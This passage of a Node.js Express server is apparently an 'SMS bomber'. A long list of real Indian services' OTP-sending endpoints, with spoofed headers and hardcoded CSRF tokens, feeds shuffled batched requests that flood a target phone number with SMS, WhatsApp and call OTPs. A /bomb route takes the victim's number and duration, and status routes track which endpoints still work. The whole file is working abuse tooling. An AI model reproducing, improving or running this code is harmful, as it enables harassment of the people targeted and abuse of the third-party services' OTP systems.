        url: "https://user.vedantu.com/user/preLoginVerification",
        headers: { "accept": "*/*", "content-type": "application/json", "origin": "https://www.vedantu.com", "referer": "https://www.vedantu.com/register" },
        data: (phone) => JSON.stringify({ email: null, phoneCode: "+91", phoneNumber: phone, sType: "VEDANTU_F_7_N", sValue: "FC34EE3ED23399CD7622BA1851D3E", token: "5nXaR2BzqApBb3Wf", ver: "1772629389", version: 2, whatsappCommunicationEnabled: false })
    },
    {
        name: "Tyreplex2_WA",
        method: "POST",
        url: "https://www.tyreplex.com/includes/ajax/gfend.php",
        headers: {
            "Accept": "application/json, text/javascript, */*; q=0.01",
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            "Origin": "https://www.tyreplex.com",
            "Referer": "https://www.tyreplex.com/login",
            "X-Requested-With": "XMLHttpRequest"
        },
        data: { "_raw": "perform_action=sendOTP&mobile_no={phone}&action_type=order_login" }
    },
    {
        name: "Wellness_Forever", url: "https://paalam.wellnessforever.in/crm/v2/firstRegisterCustomer",
        method: "POST", headers: {"Content-Type": "application/x-www-form-urlencoded"},
        data: (phone) => ({ "_raw": `method=firstRegisterApi&data={"customerMobile":"${phone}","generateOtp":"true"}` })
    },
    {
        name: "BookMyShow_2",
        method: "POST",
        url: "https://in.bookmyshow.com/pwa/api/uapi/otp/send",
        headers: {
            "accept": "application/json",
            "user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.127 Mobile Safari/537.36",
            "content-type": "application/json",
            "origin": "https://in.bookmyshow.com",
            "referer": "https://in.bookmyshow.com/login/otp?referer=/my-profile&phoneNumber={phone}&email=&source=web",
            "accept-encoding": "gzip, deflate, br",
            "accept-language": "en-US,en;q=0.9,hi;q=0.8"
        },
        data: { "channel": "phone", "subChannel": "sms", "details": { "phone": "{phone}", "origin": "https://in.bookmyshow.com" } }
    },
    {
        name: "FBBOnline_Aashu",
        method: "POST",
        url: "https://www.fbbonline.in/customer/account/GenerateOtp",
        headers: {
            "Host": "www.fbbonline.in",
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            "X-Requested-With": "XMLHttpRequest",
            "Origin": "https://www.fbbonline.in",
            "Referer": "https://www.fbbonline.in/customer/account/create"
        },
        data: { "_raw": "YII_CSRF_TOKEN=6ea54179a7dc67c7ed0d6847f76d6204320976eb&RegistrationForm%5Bsignup_page%5D=1&RegistrationForm%5Bcontact_number%5D={phone}&RegistrationForm%5Bvalid_mobile%5D=1&RegistrationForm%5Bemail%5D=test%40gmail.com&RegistrationForm%5Bvalid_email%5D=1&RegistrationForm%5Bfirst_name%5D=Test&RegistrationForm%5Blast_name%5D=User&RegistrationForm%5Bpassword%5D=Test%40123&RegistrationForm%5Btc_opt_in%5D=on&validate_otp=" }
    },
    {
        name: "Havells_WA", url: "https://havells.com/otplogin/account/otploginpost/", method: "POST",
        headers: {"Content-Type": "application/x-www-form-urlencoded"},
        data: { "_raw": "form_key=GvFYqgGVWCkuLoNT&mobile_number={phone}&is_whatsapp_promo=on" }
    },
    {
        name: "Gapoon", url: "https://www.gapoon.com/userSignup",
        method: "POST", headers: { "Content-Type": "application/x-www-form-urlencoded" },
        data: { "_raw": "mobile={phone}&email=noreply@gmail.com&name=LexLuthor" }
    },
    {
        name: "FBBOnline", method: "POST",
        url: "https://www.fbbonline.in/customer/account/GenerateOtp",
        headers: {
            "accept": "application/json, text/javascript, */*; q=0.01",
            "x-newrelic-id": "VQ8PVlFUChABV1ZRBgYCX1w=",
            "x-requested-with": "XMLHttpRequest",
            "save-data": "on",
            "user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36",
            "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
            "origin": "https://www.fbbonline.in",
            "referer": "https://www.fbbonline.in/customer/account/create",
            "accept-encoding": "gzip, deflate, br",
            "accept-language": "en-US,en;q=0.9,hi;q=0.8"
        },
        data: { "_raw": "YII_CSRF_TOKEN=6ea54179a7dc67c7ed0d6847f76d6204320976eb&RegistrationForm%5Bsignup_page%5D=1&RegistrationForm%5Bcontact_number%5D={phone}&RegistrationForm%5Bvalid_mobile%5D=1&RegistrationForm%5Bemail%5D=tsunami%40gmail.com&RegistrationForm%5Bvalid_email%5D=1&RegistrationForm%5Bfirst_name%5D=hdhdhd&RegistrationForm%5Blast_name%5D=bsbdb&RegistrationForm%5Bpassword%5D=hdhdbfbfv&RegistrationForm%5Btc_opt_in%5D=on&validate_otp=" }
    },
    {
        name: "Tyreplex2_WA",
        method: "POST",
        url: "https://www.tyreplex.com/includes/ajax/gfend.php",
        headers: {
            "Accept": "application/json, text/javascript, */*; q=0.01",
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            "Origin": "https://www.tyreplex.com",
            "Referer": "https://www.tyreplex.com/login",
            "X-Requested-With": "XMLHttpRequest"
        },
        data: { "_raw": "perform_action=sendOTP&mobile_no={phone}&action_type=order_login" }
    },
    {
        name: "Vedantu_New", url: "https://user.vedantu.com/user/preLoginVerification", method: "POST",
        headers: { "accept": "*/*", "content-type": "application/json", "origin": "https://www.vedantu.com", "referer": "https://www.vedantu.com/register" },
        data: (phone) => JSON.stringify({ email: null, phoneCode: "+91", phoneNumber: phone, sType: "VEDANTU_F_7_N", sValue: "FC34EE3ED23399CD7622BA1851D3E", token: "5nXaR2BzqApBb3Wf", ver: "1772629389", version: 2, whatsappCommunicationEnabled: false })
    },
    {
        name: "Wellness_Forever", url: "https://paalam.wellnessforever.in/crm/v2/firstRegisterCustomer",
        method: "POST", headers: {"Content-Type": "application/x-www-form-urlencoded"},
        data: (phone) => ({ "_raw": `method=firstRegisterApi&data={"customerMobile":"${phone}","generateOtp":"true"}` })
    },
    {
        name: "FBBOnline_Aashu",
        method: "POST",
        url: "https://www.fbbonline.in/customer/account/GenerateOtp",
        headers: {
            "Host": "www.fbbonline.in",
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            "X-Requested-With": "XMLHttpRequest",
            "Origin": "https://www.fbbonline.in",
            "Referer": "https://www.fbbonline.in/customer/account/create"
        },
        data: { "_raw": "YII_CSRF_TOKEN=6ea54179a7dc67c7ed0d6847f76d6204320976eb&RegistrationForm%5Bsignup_page%5D=1&RegistrationForm%5Bcontact_number%5D={phone}&RegistrationForm%5Bvalid_mobile%5D=1&RegistrationForm%5Bemail%5D=test%40gmail.com&RegistrationForm%5Bvalid_email%5D=1&RegistrationForm%5Bfirst_name%5D=Test&RegistrationForm%5Blast_name%5D=User&RegistrationForm%5Bpassword%5D=Test%40123&RegistrationForm%5Btc_opt_in%5D=on&validate_otp=" }
    },
    {
        name: "FBBOnline", method: "POST",
        url: "https://www.fbbonline.in/customer/account/GenerateOtp",
        headers: {
            "accept": "application/json, text/javascript, */*; q=0.01",
            "x-newrelic-id": "VQ8PVlFUChABV1ZRBgYCX1w=",
            "x-requested-with": "XMLHttpRequest",
            "save-data": "on",
            "user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36",
            "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
            "origin": "https://www.fbbonline.in",
            "referer": "https://www.fbbonline.in/customer/account/create",
            "accept-encoding": "gzip, deflate, br",
            "accept-language": "en-US,en;q=0.9,hi;q=0.8"
        },
        data: { "_raw": "YII_CSRF_TOKEN=6ea54179a7dc67c7ed0d6847f76d6204320976eb&RegistrationForm%5Bsignup_page%5D=1&RegistrationForm%5Bcontact_number%5D={phone}&RegistrationForm%5Bvalid_mobile%5D=1&RegistrationForm%5Bemail%5D=tsunami%40gmail.com&RegistrationForm%5Bvalid_email%5D=1&RegistrationForm%5Bfirst_name%5D=hdhdhd&RegistrationForm%5Blast_name%5D=bsbdb&RegistrationForm%5Bpassword%5D=hdhdbfbfv&RegistrationForm%5Btc_opt_in%5D=on&validate_otp=" }
    },
    {
        name: "Vedantu_New", url: "https://user.vedantu.com/user/preLoginVerification", method: "POST",
        headers: { "accept": "*/*", "content-type": "application/json", "origin": "https://www.vedantu.com", "referer": "https://www.vedantu.com/register" },
        data: (phone) => JSON.stringify({ email: null, phoneCode: "+91", phoneNumber: phone, sType: "VEDANTU_F_7_N", sValue: "FC34EE3ED23399CD7622BA1851D3E", token: "5nXaR2BzqApBb3Wf", ver: "1772629389", version: 2, whatsappCommunicationEnabled: false })
    },
    {
        name: "Wellness_Forever", url: "https://paalam.wellnessforever.in/crm/v2/firstRegisterCustomer",
        method: "POST", headers: {"Content-Type": "application/x-www-form-urlencoded"},
        data: (phone) => ({ "_raw": `method=firstRegisterApi&data={"customerMobile":"${phone}","generateOtp":"true"}` })
    },
    {
        name: "FBBOnline_Aashu",
        method: "POST",
        url: "https://www.fbbonline.in/customer/account/GenerateOtp",
        headers: {
            "Host": "www.fbbonline.in",
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            "X-Requested-With": "XMLHttpRequest",
            "Origin": "https://www.fbbonline.in",
            "Referer": "https://www.fbbonline.in/customer/account/create"
        },
        data: { "_raw": "YII_CSRF_TOKEN=6ea54179a7dc67c7ed0d6847f76d6204320976eb&RegistrationForm%5Bsignup_page%5D=1&RegistrationForm%5Bcontact_number%5D={phone}&RegistrationForm%5Bvalid_mobile%5D=1&RegistrationForm%5Bemail%5D=test%40gmail.com&RegistrationForm%5Bvalid_email%5D=1&RegistrationForm%5Bfirst_name%5D=Test&RegistrationForm%5Blast_name%5D=User&RegistrationForm%5Bpassword%5D=Test%40123&RegistrationForm%5Btc_opt_in%5D=on&validate_otp=" }
    },
    {
        name: "FBBOnline", method: "POST",
        url: "https://www.fbbonline.in/customer/account/GenerateOtp",
        headers: {
            "accept": "application/json, text/javascript, */*; q=0.01",
            "x-newrelic-id": "VQ8PVlFUChABV1ZRBgYCX1w=",
            "x-requested-with": "XMLHttpRequest",
            "save-data": "on",
            "user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36",
            "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
            "origin": "https://www.fbbonline.in",
            "referer": "https://www.fbbonline.in/customer/account/create",
            "accept-encoding": "gzip, deflate, br",
            "accept-language": "en-US,en;q=0.9,hi;q=0.8"
        },
        data: { "_raw": "YII_CSRF_TOKEN=6ea54179a7dc67c7ed0d6847f76d6204320976eb&RegistrationForm%5Bsignup_page%5D=1&RegistrationForm%5Bcontact_number%5D={phone}&RegistrationForm%5Bvalid_mobile%5D=1&RegistrationForm%5Bemail%5D=tsunami%40gmail.com&RegistrationForm%5Bvalid_email%5D=1&RegistrationForm%5Bfirst_name%5D=hdhdhd&RegistrationForm%5Blast_name%5D=bsbdb&RegistrationForm%5Bpassword%5D=hdhdbfbfv&RegistrationForm%5Btc_opt_in%5D=on&validate_otp=" }
    },
    {
        name: "Vedantu_New", url: "https://user.vedantu.com/user/preLoginVerification", method: "POST",
        headers: { "accept": "*/*", "content-type": "application/json", "origin": "https://www.vedantu.com", "referer": "https://www.vedantu.com/register" },
        data: (phone) => JSON.stringify({ email: null, phoneCode: "+91", phoneNumber: phone, sType: "VEDANTU_F_7_N", sValue: "FC34EE3ED23399CD7622BA1851D3E", token: "5nXaR2BzqApBb3Wf", ver: "1772629389", version: 2, whatsappCommunicationEnabled: false })
    },
    {
        name: "Wellness_Forever", url: "https://paalam.wellnessforever.in/crm/v2/firstRegisterCustomer",
        method: "POST", headers: {"Content-Type": "application/x-www-form-urlencoded"},
        data: (phone) => ({ "_raw": `method=firstRegisterApi&data={"customerMobile":"${phone}","generateOtp":"true"}` })
    },
    {
        name: "FBBOnline_Aashu",
        method: "POST",
        url: "https://www.fbbonline.in/customer/account/GenerateOtp",
        headers: {
            "Host": "www.fbbonline.in",
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            "X-Requested-With": "XMLHttpRequest",
            "Origin": "https://www.fbbonline.in",
            "Referer": "https://www.fbbonline.in/customer/account/create"
        },
        data: { "_raw": "YII_CSRF_TOKEN=6ea54179a7dc67c7ed0d6847f76d6204320976eb&RegistrationForm%5Bsignup_page%5D=1&RegistrationForm%5Bcontact_number%5D={phone}&RegistrationForm%5Bvalid_mobile%5D=1&RegistrationForm%5Bemail%5D=test%40gmail.com&RegistrationForm%5Bvalid_email%5D=1&RegistrationForm%5Bfirst_name%5D=Test&RegistrationForm%5Blast_name%5D=User&RegistrationForm%5Bpassword%5D=Test%40123&RegistrationForm%5Btc_opt_in%5D=on&validate_otp=" }
    },
    {
        name: "FBBOnline", method: "POST",
        url: "https://www.fbbonline.in/customer/account/GenerateOtp",
        headers: {
            "accept": "application/json, text/javascript, */*; q=0.01",
            "x-newrelic-id": "VQ8PVlFUChABV1ZRBgYCX1w=",
            "x-requested-with": "XMLHttpRequest",
            "save-data": "on",
            "user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36",
            "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
            "origin": "https://www.fbbonline.in",
            "referer": "https://www.fbbonline.in/customer/account/create",
            "accept-encoding": "gzip, deflate, br",
            "accept-language": "en-US,en;q=0.9,hi;q=0.8"
        },
        data: { "_raw": "YII_CSRF_TOKEN=6ea54179a7dc67c7ed0d6847f76d6204320976eb&RegistrationForm%5Bsignup_page%5D=1&RegistrationForm%5Bcontact_number%5D={phone}&RegistrationForm%5Bvalid_mobile%5D=1&RegistrationForm%5Bemail%5D=tsunami%40gmail.com&RegistrationForm%5Bvalid_email%5D=1&RegistrationForm%5Bfirst_name%5D=hdhdhd&RegistrationForm%5Blast_name%5D=bsbdb&RegistrationForm%5Bpassword%5D=hdhdbfbfv&RegistrationForm%5Btc_opt_in%5D=on&validate_otp=" }
    },
    {
        name: "Vedantu_New", url: "https://user.vedantu.com/user/preLoginVerification", method: "POST",
        headers: { "accept": "*/*", "content-type": "application/json", "origin": "https://www.vedantu.com", "referer": "https://www.vedantu.com/register" },
        data: (phone) => JSON.stringify({ email: null, phoneCode: "+91", phoneNumber: phone, sType: "VEDANTU_F_7_N", sValue: "FC34EE3ED23399CD7622BA1851D3E", token: "5nXaR2BzqApBb3Wf", ver: "1772629389", version: 2, whatsappCommunicationEnabled: false })
    },
    {
        name: "Wellness_Forever", url: "https://paalam.wellnessforever.in/crm/v2/firstRegisterCustomer",
        method: "POST", headers: {"Content-Type": "application/x-www-form-urlencoded"},
        data: (phone) => ({ "_raw": `method=firstRegisterApi&data={"customerMobile":"${phone}","generateOtp":"true"}` })
    },
    {
        name: "FBBOnline_Aashu",
        method: "POST",
        url: "https://www.fbbonline.in/customer/account/GenerateOtp",
        headers: {
            "Host": "www.fbbonline.in",
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            "X-Requested-With": "XMLHttpRequest",
            "Origin": "https://www.fbbonline.in",
            "Referer": "https://www.fbbonline.in/customer/account/create"
        },
        data: { "_raw": "YII_CSRF_TOKEN=6ea54179a7dc67c7ed0d6847f76d6204320976eb&RegistrationForm%5Bsignup_page%5D=1&RegistrationForm%5Bcontact_number%5D={phone}&RegistrationForm%5Bvalid_mobile%5D=1&RegistrationForm%5Bemail%5D=test%40gmail.com&RegistrationForm%5Bvalid_email%5D=1&RegistrationForm%5Bfirst_name%5D=Test&RegistrationForm%5Blast_name%5D=User&RegistrationForm%5Bpassword%5D=Test%40123&RegistrationForm%5Btc_opt_in%5D=on&validate_otp=" }
    },
    {
        name: "FBBOnline", method: "POST",
        url: "https://www.fbbonline.in/customer/account/GenerateOtp",
        headers: {
            "accept": "application/json, text/javascript, */*; q=0.01",
            "x-newrelic-id": "VQ8PVlFUChABV1ZRBgYCX1w=",
            "x-requested-with": "XMLHttpRequest",
            "save-data": "on",
            "user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36",
            "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
            "origin": "https://www.fbbonline.in",
            "referer": "https://www.fbbonline.in/customer/account/create",
            "accept-encoding": "gzip, deflate, br",
            "accept-language": "en-US,en;q=0.9,hi;q=0.8"
        },
        data: { "_raw": "YII_CSRF_TOKEN=6ea54179a7dc67c7ed0d6847f76d6204320976eb&RegistrationForm%5Bsignup_page%5D=1&RegistrationForm%5Bcontact_number%5D={phone}&RegistrationForm%5Bvalid_mobile%5D=1&RegistrationForm%5Bemail%5D=tsunami%40gmail.com&RegistrationForm%5Bvalid_email%5D=1&RegistrationForm%5Bfirst_name%5D=hdhdhd&RegistrationForm%5Blast_name%5D=bsbdb&RegistrationForm%5Bpassword%5D=hdhdbfbfv&RegistrationForm%5Btc_opt_in%5D=on&validate_otp=" }
    }
];

// ============================================================
// ===== DEDUPLICATE APIS =====
// ============================================================

const seenUrls = new Set();
const seenNames = new Set();
const uniqueApis = [];

for (const api of APIS) {
    const urlKey = typeof api.url === 'function' ? `dynamic_${api.name}` : api.url;
    const nameKey = api.name;
    if (!seenUrls.has(urlKey) && !seenNames.has(nameKey)) {
        seenUrls.add(urlKey);
        seenNames.add(nameKey);
        uniqueApis.push(api);
    }
}

// ============================================================
// ===== SPLIT APIS =====
// ============================================================

const NORMAL_APIS = uniqueApis.filter(api => !api.rateLimit);
const RATE_LIMIT_APIS = uniqueApis.filter(api => api.rateLimit);

console.log(`✅ Loaded ${uniqueApis.length} total unique APIs`);
console.log(`   🟢 Normal: ${NORMAL_APIS.length} | ⚠️ RL: ${RATE_LIMIT_APIS.length}`);

// ============================================================
// ===== STATS & LOGGING =====
// ============================================================

const stats = {};
const recentLogs = [];
const MAX_LOGS = 500;

uniqueApis.forEach(api => {
    stats[api.name] = {
        name: api.name,
        total: 0,
        working_2xx: 0,
        rate_limited_429: 0,
        rejected_4xx: 0,
        failed_5xx: 0,
        network_error: 0,
        lastStatus: null,
        lastStatusCode: null,
        lastTime: null,
        lastError: null,
        avgResponseTime: 0,
        isRateLimited: api.rateLimit || false
    };
});

function logEvent(msg, type = 'info') {
    const emoji = { info: 'ℹ️', success: '✅', error: '❌', warn: '⚠️', rl: '🚫' }[type] || 'ℹ️';
    console.log(`${emoji} [${new Date().toISOString().slice(11, 19)}] ${msg}`);
    recentLogs.push({ time: new Date().toISOString(), type, msg });
    if (recentLogs.length > MAX_LOGS) recentLogs.shift();
}

function recordResult(apiName, category, statusCode, responseTime, error = null) {
    const s = stats[apiName];
    if (!s) return;
    s.total++;
    if (category === 'success') { s.working_2xx++; s.lastStatus = 'WORKING'; }
    else if (category === 'ratelimit') { s.rate_limited_429++; s.lastStatus = 'RATE_LIMITED'; }
    else if (category === 'rejected') { s.rejected_4xx++; s.lastStatus = 'REJECTED'; }
    else if (category === 'fail5xx') { s.failed_5xx++; s.lastStatus = 'FAILED_5XX'; }
    else { s.network_error++; s.lastStatus = 'NETWORK_ERROR'; }
    s.lastStatusCode = statusCode;
    s.lastTime = new Date().toISOString();
    s.lastError = error;
    s.avgResponseTime = s.avgResponseTime === 0 ? responseTime : Math.round((s.avgResponseTime * (s.total - 1) + responseTime) / s.total);
}

// ============================================================
// ===== API CALL FUNCTION =====
// ============================================================

function makeFallbackData(phone, apiName) {
    const lower = apiName.toLowerCase();
    if (lower.includes('voice') || lower.includes('call')) return JSON.stringify({ mobile: phone });
    if (lower.includes('whatsapp')) return JSON.stringify({ mobile: phone, channel: "whatsapp" });
    return JSON.stringify({ mobile: phone });
}

async function makeApiCall(api, phone, retryCount = 0) {
    const startTime = Date.now();
    try {
        let url = api.url;
        if (typeof url === 'function') url = url(phone);
        else if (url.includes('{phone}')) url = url.replace(/{phone}/g, phone);

        const headers = { ...api.headers };
        delete headers['content-length'];
        delete headers['Content-Length'];
        delete headers['host'];
        delete headers['Host'];

        let data = null;
        let isRaw = false;

        if (api.data) {
            if (typeof api.data === 'function') data = api.data(phone);
            else if (api.data._raw) {
                let rawData = api.data._raw;
                if (typeof rawData === 'string') rawData = rawData.replace(/{phone}/g, phone);
                data = rawData;
                isRaw = true;
            } else {
                data = JSON.parse(JSON.stringify(api.data));
                const replacePhone = (obj) => {
                    if (typeof obj === 'string') return obj.replace(/{phone}/g, phone);
                    if (Array.isArray(obj)) return obj.map(replacePhone);
                    if (typeof obj === 'object' && obj !== null) {
                        const newObj = {};
                        for (let key in obj) newObj[key] = replacePhone(obj[key]);
                        return newObj;
                    }
                    return obj;
                };
                data = replacePhone(data);
            }
        } else {
            data = makeFallbackData(phone, api.name);
        }

        const method = api.method.toLowerCase();
        const config = { method, url, headers, timeout: 5000, validateStatus: () => true };

        if (method === 'post' || method === 'put') {
            if (isRaw || typeof data === 'string') {
                config.data = data;
                if (typeof data === 'string' && data.includes('=') && !data.startsWith('{') && !data.startsWith('[')) {
                    headers['Content-Type'] = 'application/x-www-form-urlencoded';
                }
            } else {
                config.data = JSON.stringify(data);
                if (!headers['Content-Type']) headers['Content-Type'] = 'application/json';
            }
        }

        const response = await axios(config);
        const responseTime = Date.now() - startTime;
        const st = response.status;

        if (st >= 200 && st < 300) {
            recordResult(api.name, 'success', st, responseTime);
            logEvent(`${api.name} → ${st} (${responseTime}ms) ✅`, 'success');
            return { status: st, success: true, category: 'success', responseTime };
        } else if (st === 429) {
            recordResult(api.name, 'ratelimit', st, responseTime);
            logEvent(`${api.name} → 429 RL (${responseTime}ms)`, 'rl');
            if (api.rateLimit && retryCount < 1) {
                await new Promise(r => setTimeout(r, 3000));
                return makeApiCall(api, phone, retryCount + 1);
            }
            return { status: st, success: false, category: 'ratelimit', responseTime };
        } else if (st >= 400 && st < 500) {
            recordResult(api.name, 'rejected', st, responseTime);
            logEvent(`${api.name} → ${st} REJECTED (${responseTime}ms)`, 'warn');
            return { status: st, success: false, category: 'rejected', responseTime };
        } else {
            recordResult(api.name, 'fail5xx', st, responseTime);
            logEvent(`${api.name} → ${st} 5XX (${responseTime}ms)`, 'error');
            return { status: st, success: false, category: 'fail5xx', responseTime };
        }
    } catch (err) {
        const responseTime = Date.now() - startTime;
        const errMsg = err.code || err.message || 'Unknown';

        if (retryCount < 1 && (err.code === 'ECONNRESET' || err.code === 'ETIMEDOUT' || err.code === 'ECONNABORTED')) {
            return makeApiCall(api, phone, retryCount + 1);
        }

        recordResult(api.name, 'network', null, responseTime, errMsg);
        logEvent(`${api.name} → NETWORK_FAIL (${responseTime}ms) ${errMsg}`, 'error');
        return { status: null, success: false, category: 'network', responseTime, error: errMsg };
    }
}

// ============================================================
// ===== BOMBING LOGIC =====
// ============================================================

async function runBombing(phone, effectiveDuration) {
    const startTime = Date.now();
    let success = 0, smsCount = 0, callCount = 0, whatsappCount = 0;
    let rateLimited = 0, rejected = 0, failed = 0;

    let maxRequests = 100;
    if (effectiveDuration <= 1) maxRequests = 200;
    else if (effectiveDuration <= 5) maxRequests = 150;
    else if (effectiveDuration <= 10) maxRequests = 100;
    else maxRequests = 80;

    const shuffledNormal = [...NORMAL_APIS];
    for (let i = shuffledNormal.length - 1; i > 0; i--) {
        const j = Math.floor(Math.random() * (i + 1));
        [shuffledNormal[i], shuffledNormal[j]] = [shuffledNormal[j], shuffledNormal[i]];
    }

    const shuffledRateLimit = [...RATE_LIMIT_APIS];
    for (let i = shuffledRateLimit.length - 1; i > 0; i--) {
        const j = Math.floor(Math.random() * (i + 1));
        [shuffledRateLimit[i], shuffledRateLimit[j]] = [shuffledRateLimit[j], shuffledRateLimit[i]];
    }

    const combined = [];
    let rateLimitIdx = 0;
    for (let i = 0; i < shuffledNormal.length; i++) {
        combined.push(shuffledNormal[i]);
        if ((i + 1) % 5 === 0 && rateLimitIdx < shuffledRateLimit.length) {
            combined.push(shuffledRateLimit[rateLimitIdx]);
            rateLimitIdx++;
        }
    }
    while (rateLimitIdx < shuffledRateLimit.length) {
        combined.push(shuffledRateLimit[rateLimitIdx]);
        rateLimitIdx++;
    }

    console.log(`📋 Combined: ${combined.length} APIs (Normal: ${shuffledNormal.length}, RL: ${shuffledRateLimit.length})`);

    let sent = 0;
    const BATCH_SIZE = 5;

    for (let i = 0; i < combined.length && sent < maxRequests; i += BATCH_SIZE) {
        const batch = combined.slice(i, Math.min(i + BATCH_SIZE, combined.length));
        const results = await Promise.allSettled(batch.map(api => makeApiCall(api, phone)));

        for (let k = 0; k < results.length; k++) {
            const result = results[k];
            const api = batch[k];
            if (result.status === 'fulfilled' && result.value) {
                const v = result.value;
                if (v.success) {
                    success++;
                    sent++;
                    const apiName = api.name || '';
                    const isCall = apiName.toLowerCase().includes('call') || apiName.toLowerCase().includes('voice');
                    const isWhatsapp = apiName.toLowerCase().includes('whatsapp') || apiName.toLowerCase().includes('_wa');
                    if (isCall) callCount++;
                    else if (isWhatsapp) whatsappCount++;
                    else smsCount++;
                } else if (v.category === 'ratelimit') rateLimited++;
                else if (v.category === 'rejected') rejected++;
                else failed++;
            }
        }

        if (i + BATCH_SIZE < combined.length && sent < maxRequests) {
            await new Promise(r => setTimeout(r, BATCH_DELAY_MS));
        }
    }

    const elapsed = (Date.now() - startTime) / 1000;
    return { success, smsCount, callCount, whatsappCount, rateLimited, rejected, failed, elapsed: elapsed.toFixed(1) };
}

// ============================================================
// ===== ROUTES =====
// ============================================================

app.get('/', (req, res) => {
    res.json({
        status: 'ok',
        instance: process.env.INSTANCE_NAME || 'api',
        total_apis: uniqueApis.length,
        normal_apis: NORMAL_APIS.length,
        rate_limited_apis: RATE_LIMIT_APIS.length,
        max_duration_min: MAX_DURATION_MIN,
        uptime: Math.round(process.uptime()) + 's'
    });
});

app.get('/health', (req, res) => {
    res.json({ status: 'ok', uptime: process.uptime(), apis: uniqueApis.length });
});

app.get('/test', async (req, res) => {
    const phone = req.query.phone || '9999999999';
    logEvent(`🧪 Testing all APIs with ${phone}...`, 'info');
    const results = [];
    for (const api of uniqueApis) {
        const r = await makeApiCall(api, phone);
        results.push({ name: api.name, ...r });
        await new Promise(r => setTimeout(r, 150));
    }
    const working = results.filter(r => r.success).length;
    const rl = results.filter(r => r.category === 'ratelimit').length;
    const rej = results.filter(r => r.category === 'rejected').length;
    logEvent(`🧪 Test done: ${working} OK, ${rl} RL, ${rej} Rejected`, 'info');
    res.json({ phone, total: results.length, working, rate_limited: rl, rejected: rej, failed: results.length - working - rl - rej, results });
});

// 🔥 MAIN STATS ROUTE - Shows all API status
app.get('/stats', (req, res) => {
    const arr = Object.values(stats).map(s => {
        let status = 'NEVER TESTED';
        if (s.total > 0) {
            if (s.working_2xx > 0) status = 'WORKING';
            else if (s.rate_limited_429 > 0) status = 'RATE_LIMITED';
            else if (s.rejected_4xx > 0) status = 'REJECTED';
            else status = 'FAILED';
        }
        return {
            name: s.name,
            isRateLimited: s.isRateLimited,
            total: s.total,
            working_2xx: s.working_2xx,
            rate_limited_429: s.rate_limited_429,
            rejected_4xx: s.rejected_4xx,
            failed_5xx: s.failed_5xx,
            network_error: s.network_error,
            successRate: s.total > 0 ? ((s.working_2xx / s.total) * 100).toFixed(1) + '%' : 'N/A',
            status,
            lastStatusCode: s.lastStatusCode,
            lastError: s.lastError,
            avgResponseTime: s.avgResponseTime + 'ms'
        };
    });
    res.json({
        summary: {
            total: arr.length,
            working: arr.filter(a => a.status === 'WORKING').length,
            rate_limited: arr.filter(a => a.status === 'RATE_LIMITED').length,
            rejected: arr.filter(a => a.status === 'REJECTED').length,
            failed: arr.filter(a => a.status === 'FAILED').length,
            untested: arr.filter(a => a.status === 'NEVER TESTED').length,
            marked_rate_limited: arr.filter(a => a.isRateLimited).length
        },
        apis: arr
    });
});

app.get('/logs', (req, res) => {
    res.json({ count: recentLogs.length, logs: recentLogs.slice(-100).reverse() });
});

app.get('/reset-stats', (req, res) => {
    for (const key in stats) {
        stats[key] = { 
            name: stats[key].name, total: 0, working_2xx: 0, rate_limited_429: 0, 
            rejected_4xx: 0, failed_5xx: 0, network_error: 0, lastStatus: null, 
            lastStatusCode: null, lastTime: null, lastError: null, avgResponseTime: 0,
            isRateLimited: stats[key].isRateLimited
        };
    }
    recentLogs.length = 0;
    logEvent('Stats reset', 'warn');
    res.json({ success: true });
});

app.post('/bomb', async (req, res) => {
    const { phone, duration, instance } = req.body;
    if (!phone || phone.length !== 10) return res.status(400).json({ error: 'Invalid phone number.' });

    const requestedDuration = Number(duration) || 1;
    const effectiveDuration = Math.min(requestedDuration, MAX_DURATION_MIN);

    console.log(`\n📱 Bombing ${phone} | Requested: ${requestedDuration}min | Effective: ${effectiveDuration}min`);

    try {
        const result = await runBombing(phone, effectiveDuration);
        console.log(`✅ DONE | ${phone} | OK: ${result.success} | RL: ${result.rateLimited} | Rejected: ${result.rejected} | Failed: ${result.failed} | ${result.elapsed}s\n`);
        res.json({
            success: true, phone,
            requested_duration: requestedDuration,
            effective_duration: effectiveDuration,
            instance: instance || 'default',
            totalSent: result.success,
            sms: result.smsCount,
            calls: result.callCount,
            whatsapp: result.whatsappCount,
            rate_limited: result.rateLimited,
            rejected: result.rejected,
            failed: result.failed,
            elapsed: result.elapsed + 's',
            total_apis: uniqueApis.length
        });
    } catch (error) {
        console.error('Bombing error:', error);
        res.status(500).json({ error: error.message });
    }
});

app.get('/apis', (req, res) => {
    res.json({
        total: uniqueApis.length,
        normal: NORMAL_APIS.length,
        rate_limited: RATE_LIMIT_APIS.length,
        normal_api_names: NORMAL_APIS.map(a => a.name),
        rate_limited_api_names: RATE_LIMIT_APIS.map(a => a.name)
    });
});

const PORT = process.env.PORT || 10000;
